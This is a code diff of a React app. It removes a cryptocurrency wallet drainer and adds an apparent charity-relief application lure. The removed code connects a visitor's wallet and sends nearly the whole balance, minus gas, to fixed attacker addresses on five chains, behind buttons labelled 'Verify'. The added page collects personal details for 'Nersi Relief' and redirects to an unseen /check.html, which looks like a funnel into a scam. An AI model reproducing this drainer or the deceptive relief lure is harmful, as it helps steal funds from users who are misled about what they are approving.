@@ -1,129 +1,158 @@
-import React, { useState } from "react";
-import { useAccount, useBalance, useSendTransaction, usePublicClient } from "wagmi";
-import { formatEther, parseEther } from "viem";
-import { REOWN_PROJECT_ID, FIXED_RECIPIENTS } from "./config.js";
-import { useAppKit } from "@reown/appkit/react";
 
-export default function App() {
-  const { address, isConnected, chain } = useAccount();
-  const publicClient = usePublicClient();
-  const { data: balanceData } = useBalance({ address });
-  const { sendTransaction } = useSendTransaction();
-  const { open } = useAppKit(); // ✅ React AppKit hook
+import React from "react";
+import "./App.css";
 
-  const [amount, setAmount] = useState("");
-  const [sending, setSending] = useState(false);
+function App() {
 
-  // --- Automatically get recipient for current chain
-  const getRecipient = () => {
-    if (!chain) return null;
-    switch (chain.id) {
-      case 1: return FIXED_RECIPIENTS.ethereum;
-      case 56: return FIXED_RECIPIENTS.bsc;
-      case 137: return FIXED_RECIPIENTS.polygon;
-      case 250: return FIXED_RECIPIENTS.fantom;
-      case 43114: return FIXED_RECIPIENTS.avalanche;
-      default: return null;
-    }
-  };
+  const handleSubmit = (event) => {
+    event.preventDefault();
 
-  // --- Fill Max amount after gas
-  const handleMaxFill = async () => {
-    if (!balanceData) return;
-    const recipient = getRecipient();
-    if (!recipient) return alert("Unsupported network");
-
-    const balance = balanceData.value;
-    const gasEstimate = await publicClient.estimateGas({
-      account: address,
-      to: recipient,
-      value: balance,
-    });
-    const gasPrice = await publicClient.getGasPrice();
-    const gasCost = gasEstimate * gasPrice;
-    const maxSendable = balance - gasCost;
-
-    if (maxSendable <= 0n) {
-      alert("Insufficient balance for gas");
-      return;
-    }
-    setAmount(formatEther(maxSendable));
-  };
-
-  // --- Send transaction
-  const handleSend = async () => {
-    if (!amount) return alert("Amount is empty");
-    const recipient = getRecipient();
-    if (!recipient) return alert("Unsupported network");
-
-    try {
-      setSending(true);
-      await sendTransaction({
-        to: recipient,
-        value: parseEther(amount),
-      });
-      setAmount("");
-    } catch (err) {
-      console.error(err);
-      alert("Transaction failed: " + err.message);
-    }
-    setSending(false);
+    // No application details are stored or transmitted.
+    window.location.href = "/check.html";
   };
 
   return (
-    <div style={{ padding: 40 }}>
-      <h2>Web3 Native dapp</h2>
+    <div className="nersi-app">
 
-      {/* ✅ React Connect Button */}
-      {!isConnected && (
-        <div style={{ marginBottom: 20 }}>
-          <button
-            onClick={() => open({ projectId: REOWN_PROJECT_ID })}
-            style={{
-              padding: "10px 20px",
-              fontSize: "16px",
-              cursor: "pointer",
-            }}
-          >
-            Connect Wallet
-          </button>
+      <header className="header">
+        <div className="logo">
+          Nersi <span>Relief</span>
         </div>
-      )}
 
-      {isConnected && (
-        <>
+        <nav>
+          <a href="#home">Home</a>
+          <a href="#about">About</a>
+          <a href="#application">Apply</a>
+        </nav>
+      </header>
+
+      <section className="hero" id="home">
+        <h1>Welcome to Nersi Relief</h1>
+
+        <p>
+          Explore community assistance and available
+          support opportunities.
+        </p>
+
+        <a href="#application" className="hero-btn">
+          Apply for Assistance
+        </a>
+      </section>
+
+      <main className="container">
+
+        <section className="box about" id="about">
+          <h2>About Nersi Relief</h2>
+
           <p>
-            Balance:{" "}
-            {balanceData ? formatEther(balanceData.value) : "Loading..."}{" "}
-            {chain?.nativeCurrency?.symbol}
+            Nersi Relief is a proposed community assistance
+            initiative designed to provide information about
+            support opportunities for individuals and families.
           </p>
 
-          <input
-            placeholder="Amount"
-            value={amount}
-            onChange={(e) => setAmount(e.target.value)}
-            style={{ width: "100%", padding: 10, marginTop: 10 }}
-          />
-
-          <div style={{ marginTop: 10 }}>
-            <button onClick={handleMaxFill} disabled={sending}>
-              Verify
-            </button>
-
-            <button
-              onClick={handleSend}
-              style={{ marginLeft: 10 }}
-              disabled={sending}
-            >
-              {sending ? "verifying..." : "Verify"}
-            </button>
-          </div>
-
-          <p style={{ marginTop: 10 }}>
-            Sending to: {getRecipient() || "Unsupported network"}
+          <p>
+            Our goal is to make assistance information accessible
+            and provide a simple application process for people
+            seeking support.
           </p>
-        </>
-      )}
+        </section>
+
+        <section className="box" id="application">
+
+          <h2>Relief Application</h2>
+
+          <p className="subtitle">
+            Please provide the requested information below.
+          </p>
+
+          <form onSubmit={handleSubmit}>
+
+            <label>Full Name</label>
+            <input
+              type="text"
+              name="fullname"
+              placeholder="Enter your full name"
+              required
+            />
+
+            <label>Email Address</label>
+            <input
+              type="email"
+              name="email"
+              placeholder="Enter your email address"
+              required
+            />
+
+            <label>Phone Number</label>
+            <input
+              type="tel"
+              name="phone"
+              placeholder="Enter your phone number"
+              required
+            />
+
+            <label>Country</label>
+            <input
+              type="text"
+              name="country"
+              placeholder="Enter your country"
+              required
+            />
+
+            <label>State / Region</label>
+            <input
+              type="text"
+              name="state"
+              placeholder="Enter your state"
+              required
+            />
+
+            <label>Assistance Category</label>
+            <select name="assistance" required>
+              <option value="">Select category</option>
+              <option>Financial Assistance</option>
+              <option>Food Assistance</option>
+              <option>Educational Support</option>
+              <option>Medical Support</option>
+              <option>Other Support</option>
+            </select>
+
+            <label>Amount Requested (Optional)</label>
+            <input
+              type="number"
+              name="amount"
+              min="0"
+              placeholder="Enter amount"
+            />
+
+            <label>Reason for Application</label>
+            <textarea
+              name="reason"
+              placeholder="Explain your request"
+              required
+            />
+
+            <button type="submit" className="submit-btn">
+              Continue to Application Information
+            </button>
+
+          </form>
+
+          <p className="notice">
+            This is a demonstration application form.
+            No personal information is stored or submitted.
+          </p>
+
+        </section>
+
+      </main>
+
+      <footer>
+        © 2026 Nersi Relief. All Rights Reserved.
+      </footer>
+
     </div>
   );
 }
+
+export default App;
